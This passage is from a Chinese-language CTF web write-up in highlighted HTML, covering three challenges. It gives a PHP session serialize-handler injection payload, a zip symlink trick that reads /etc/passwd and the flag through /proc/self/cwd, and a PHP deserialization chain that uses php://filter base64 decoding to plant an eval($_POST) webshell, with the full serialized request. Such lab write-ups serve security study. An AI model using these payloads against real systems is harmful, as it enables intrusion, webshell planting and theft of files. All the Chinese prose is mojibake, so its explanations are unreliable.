class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ<code>title</code>å®Œå…¨å¯æ§ï¼š</p><p><img src="/img/SWPU2019Web34.png" alt="SWPU2019Web34"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">session.serialize_handler   <span class="hljs-built_in">string</span> <span class="hljs-comment">--å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</span><br>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼<br></code></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªå†…å®¹ä¸º<code>|N;admin|b:1;</code>çš„æ•°æ®ï¼Œ<code>|N;</code>å°†å‰é¢çš„æ‚ä¹±çš„æ•°æ®ä½œä¸ºä¸€ä¸ªé”®è§£å†³æ‰ã€‚</p><p>ç»¼ä¸Šï¼Œæ„é€ <code>payload</code>æ­¥éª¤ï¼š</p><p>ç”¨æˆ·å<code>sess_</code>ï¼Œ<code>title</code>ä¸º<code>|N;admin|b:1;</code>ã€‚å¯¼å‡ºåæŠ“åŒ…ä¿®æ”¹å¯¹åº”<code>PHPSESSIONID</code>å³å¯ã€‚</p><h4 id="æ€è·¯æ€»ç»“ï¼š-6"><a href="#æ€è·¯æ€»ç»“ï¼š-6" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p><code>session</code>æ–‡ä»¶åï¼Œååºåˆ—åŒ–å¼•æ“ã€‚</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">å‚è€ƒèµ„æ–™</a></p><h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>æ˜æ–‡ä¼ è¾“ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œä¸”è¿™ä¸ªcookieçœ‹ç€åƒ<code>JWT</code>ï¼š</p><p><img src="/img/SWPU2019Web31.png" alt="SWPU2019Web31"></p><p>åç»­ï¼šé¶åœºæœ‰é—®é¢˜ï¼Œç™»å½•ä¸ä¸Šå»ã€‚ç›´æ¥çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„wp:</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105666388">å‚è€ƒèµ„æ–™</a></p><p><a href="https://hwlanxiaojun.github.io/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/#0x-05-SWPU2019-Web3">å‚è€ƒèµ„æ–™</a></p><p>ç™»å½•åä¼šå‡ºç°ä¸Šä¼ åŠŸèƒ½ï¼Œä½†ä¼šæç¤ºæƒé™ä¸å¤Ÿã€‚ä¼ªé€ sessionéœ€è¦keyï¼Œè¿™ä¸ªkeyåœ¨è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢æ—¶è¢«æ”¾åˆ°è¯·æ±‚å¤´é‡Œäº†ï¼Œç„¶åå°±æ˜¯å¸¸è§„çš„sessionä¼ªé€ ã€‚ä¸Šä¼ ç•Œé¢å³é”®å­˜åœ¨æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(temp)<br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        m = hashlib.md5()<br>        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span><br>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        m.update(name)<br>        md5_one= m.hexdigest()<br>        n = hashlib.md5()<br>        ip = request.remote_addr<br>        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        n.update(ip)<br>        md5_ip = n.hexdigest()<br>        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        basepath=os.path.dirname(os.path.realpath(__file__))<br>        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span><br>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span><br>        filename = f.filename<br>        pathname = path+filename<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]: <span class="hljs-comment">#æŒ‰.åˆ†å‰²filenameï¼Œç„¶åå–æœ€åä¸€ä¸ªå…ƒç´ åˆ¤æ–­æ˜¯å¦ä¸ºsplit</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path_base)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):<br>            <span class="hljs-keyword">try</span>:<br>                f.save(pathname)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname<br>            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>waf()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            os.system(cmd)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)<br>        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                shutil.rmtree(path_base)<br>                os.mkdir(path_base)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>            resp = make_response(image)<br>            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            shutil.rmtree(path_base)<br>            os.mkdir(path_base)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">showflag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:<br>        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()<br>        resp = make_response(image)<br>        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sæ˜¯Linuxçš„ä¸€ç§è½¯è¿æ¥,ç±»ä¼¼ä¸windowsçš„å¿«æ·æ–¹å¼<br>ln -s <span class="hljs-regexp">/etc/</span>passwd forever404 è¿™ä¼šå‡ºç°ä¸€ä¸ªforever404æ–‡æœ¬,é‡Œé¢åŒ…å«å¯†ç <br><span class="hljs-regexp">/proc/</span>self è®°å½•äº†ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ç­‰,cwd æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥,å³flaskè¿è¡Œè¿›ç¨‹ç›®å½•<br><br>ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg test<br>zip -ry test.zip test<br>-rï¼šè¡¨ç¤ºé€’å½’åœ°åŒ…å«æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ã€‚<br>-yï¼šè¡¨ç¤ºå°†ç¬¦å·é“¾æ¥ï¼ˆsymbolic linksï¼‰ä½œä¸ºç¬¦å·é“¾æ¥ä¿å­˜ï¼Œè€Œä¸è§£å¼•ç”¨å®ƒä»¬ã€‚è¿™é€šå¸¸ç”¨äºåœ¨ ZIP æ–‡ä»¶ä¸­ä¿ç•™ç¬¦å·é“¾æ¥çš„åŸå§‹çŠ¶æ€<br></code></pre></td></tr></table></figure><p>è¿™é¢˜ç¯å¢ƒæœ‰é—®é¢˜åªèƒ½è¿™æ ·éšä¾¿å†™å†™äº†ã€‚ã€‚</p><h4 id="æ€è·¯æ€»ç»“ï¼š-7"><a href="#æ€è·¯æ€»ç»“ï¼š-7" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p>è½¯é“¾æ¥&#x2F;ç¬¦å·é“¾æ¥ï¼Ÿ<code>/proc/self/cwd</code>ç›®å½•ï¼Ÿåœ¨è§£å‹æ–‡ä»¶æ—¶å¯èƒ½ä¼šå‘ç”Ÿä»€ä¹ˆé—®é¢˜ï¼Ÿ</p><h2 id="ç¾ŠåŸæ¯-2020-EasySer"><a href="#ç¾ŠåŸæ¯-2020-EasySer" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]EasySer"></a>[ç¾ŠåŸæ¯ 2020]EasySer</h2><p>?</p><p><img src="/img/yangchengbeiser1.png" alt="yangchengbeiser1"></p><p>å­˜åœ¨<code>robots.php</code>ï¼Œè®¿é—®ï¼š<code>star1.php</code>:</p><p><img src="/img/yangchengbeiser2.png" alt="yangchengbeiser2"></p><p>å³é”®æºç ï¼Œå­˜åœ¨ï¼š</p><p><img src="/img/yangchengbeiser3.png" alt="yangchengbeiser3"></p><p><code>ä¸å®‰å…¨çš„åè®®ä»æˆ‘å®¶è¿›å…¥ser.php</code>ï¼Œæœ€å¼€å§‹è¯•äº†è¯•<code>http://127.0.0.1/ser.php</code>å‘ç°é‡å®šå‘åˆ°<code>baidu</code>äº†ï¼Œä»¥ä¸ºè¿™é‡Œç”¨çš„<code>parse_url</code>è§£æåˆè¯•äº†å…¶ä»–çš„ä¹Ÿä¸è¡Œã€‚ã€‚åé¢æ‰çŸ¥é“æ˜¯ç«ç‹çš„é—®é¢˜ï¼Œä»–ä¸å…è®¸åœ¨è¿™ä¸ªé¡µé¢åµŒå…¥å…¶å®ƒç½‘ç«™çš„é¡µé¢å¯¼è‡´æˆ‘ä¸€ç›´è®¿é—®ä¸äº†è¿™ä¸ª<code>ser.php</code></p><p>ç›´æ¥çœ‹çš„wp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yasuo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hero)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;hero-&gt;<span class="hljs-title function_ invoke__">hasaki</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You don&#x27;t look very happy&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;text = <span class="hljs-variable">$text</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$d</span> . <span class="hljs-variable language_">$this</span>-&gt;text;<br>        @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yasuo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m the best happy windy man&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Yongen</code>ç±»ä¸‹æç¤º<code>flag.php</code>ï¼Œ<code>hasaki</code>å‡½æ•°è™½ç„¶æœ‰<code>file_put_contents</code>ä½†å­˜åœ¨<code>die</code>è¿™ä¸ªä¸œè¥¿ã€‚ä½†ï¼š</p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.freebuf.com/articles/web/266565.html">æ­»äº¡ç»•è¿‡</a></p><p>ç»¼ä¸Šï¼Œexp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span><br>        ;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;text = <span class="hljs-variable">$text</span>;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GWHT</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yongen</span>();<br><span class="hljs-variable">$a</span> -&gt;hero = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt;file = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=r.php&#x27;</span>;<br><span class="hljs-variable">$b</span> -&gt;text = <span class="hljs-string">&#x27;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&#x27;</span>;<span class="hljs-comment">// &lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>æœ€åæœ‰ä¸€ä¸ªæ³¨æ„çš„ç‚¹æ˜¯<code>&lt;?php die(&quot;nononon&quot;);?&gt;</code>è¿™ä¸œè¥¿åŒ…å«ä¸ç¬¦åˆ<code>base64</code>ç¼–ç çš„å­—ç¬¦èŒƒå›´ï¼Œç›¸å½“äºè§£ç <code>phpdienononon</code>å…±13ä¸ªå­—ç¬¦ï¼Œ<code>base64</code>è§£ç æ—¶å››ä¸ªæ¯”ç‰¹ä¸€ç»„ï¼Œæ‰€ä»¥è¦éšä¾¿è¡¥ä¸‰ä¸ªå­—ç¬¦ã€‚</p><p>ç„¶åå°±æ˜¯ä¼ ç»™å“ªä¸ªå‚æ•°çš„é—®é¢˜ï¼ŒArjunç›´æ¥æ‰«å°±è¡Œ(æ‡’å¾—å¼„äº†)ã€‚</p><p>ç»¼ä¸Šï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?path<span class="hljs-operator">=</span>http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/star<span class="hljs-number">1</span>.php&amp;<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>GWHT<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>hero<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Yongen<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>file<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">55</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>php<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Ffilter<span class="hljs-variable">%2</span>Fwrite<span class="hljs-variable">%3</span>Dconvert.base<span class="hljs-number">64</span>-decode<span class="hljs-variable">%2</span>Fresource<span class="hljs-variable">%3</span>Dr.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>text<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">39</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>aaaPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbJ<span class="hljs-number">2</span>EnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p>ä¸urlç¼–ç ä¸€ä¸‹ä¹Ÿè¡Œï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>ath=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/star</span>1.php&amp;c=<span class="hljs-symbol">O:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;GWHT&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;hero&quot;</span></span>;<span class="hljs-symbol">O:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;Yongen&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;file&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">55</span><span class="hljs-symbol">:<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=1.php&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;text&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">39</span><span class="hljs-symbol">:<span 